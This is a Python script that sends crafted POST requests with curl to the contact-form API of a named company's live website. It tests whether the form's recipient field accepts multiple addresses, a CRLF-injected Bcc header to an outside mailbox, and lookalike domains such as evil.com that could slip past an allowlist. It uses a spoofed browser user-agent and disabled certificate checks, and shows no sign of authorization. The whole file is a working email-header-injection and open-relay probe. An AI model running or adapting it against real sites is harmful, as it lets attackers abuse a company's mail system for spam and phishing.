import subprocess

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
AT = chr(64)

def send(fields, raw_targets=None):
    args = ["curl","-sk","-A",UA,"-X","POST","https://www.infinitycapital.bh/api/send",
            "-H","Content-Type: application/x-www-form-urlencoded"]
    if raw_targets is not None:
        args += ["--data-urlencode","targets="+raw_targets]
    for k,v in fields.items():
        args += ["--data-urlencode", k+"="+v]
    args += ["-o","/tmp/o2.bin","-w","%{http_code}|%{size_download}"]
    subprocess.run(args, capture_output=True, text=True)
    return open("/tmp/o2.bin","rb").read()[:500]

base = {"fname":"probe","lname":"sec","areacode":"973","tel":"5551234",
        "cname":"qa","subject":"hello","msg":"body","check":"on"}

# 1. multiple recipients / comma list
print("== comma list ==")
print(send(base, "a"+AT+"infinitycapital.bh, b"+AT+"infinitycapital.bh"))
print("== space list ==")
print(send(base, "a"+AT+"infinitycapital.bh b"+AT+"infinitycapital.bh"))
print("== CRLF header inject in targets ==")
print(send(base, "a"+AT+"infinitycapital.bh\r\nBcc: victim"+AT+"mailinator.com"))

# 2. subdomain of allowlisted?
for d in ["sub.infinitycapital.bh","evil.com","x@y.com","infinitycapital.bh.evil.com"]:
    print("==",d,"==")
    print(send(base, "a"+AT+d))
